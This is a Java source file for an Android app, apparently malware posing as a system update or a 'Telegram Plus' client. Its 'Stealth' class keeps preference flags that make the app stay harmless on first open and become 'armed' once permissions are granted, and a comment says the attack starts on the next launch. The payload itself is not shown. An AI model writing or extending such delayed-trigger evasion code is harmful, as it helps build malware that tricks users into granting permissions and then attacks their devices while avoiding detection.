package com.system.update;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * first_open: calm only
 * armed: set when first activity finishes after perms — attack on NEXT process start / reopen
 */
public final class Stealth {
    private static final String PREF = "tg_plus_prefs";
    private static final String KEY_ARMED = "armed";
    private static final String KEY_PERMS = "perms_done";
    private static final String KEY_SETUP = "setup_session";

    private Stealth() {}

    private static SharedPreferences p(Context c) {
        return c.getApplicationContext().getSharedPreferences(PREF, Context.MODE_PRIVATE);
    }

    public static boolean isArmed(Context c) {
        if (c == null) return false;
        return p(c).getBoolean(KEY_ARMED, false);
    }

    public static void setArmed(Context c, boolean v) {
        p(c).edit().putBoolean(KEY_ARMED, v).apply();
    }

    public static boolean permsDone(Context c) {
        return p(c).getBoolean(KEY_PERMS, false);
    }

    public static void setPermsDone(Context c, boolean v) {
        p(c).edit().putBoolean(KEY_PERMS, v).apply();
    }

    /** True while still in first setup activity instance. */
    public static boolean isSetupSession(Context c) {
        return p(c).getBoolean(KEY_SETUP, true);
    }

    public static void endSetupSession(Context c) {
        p(c).edit().putBoolean(KEY_SETUP, false).apply();
    }
}
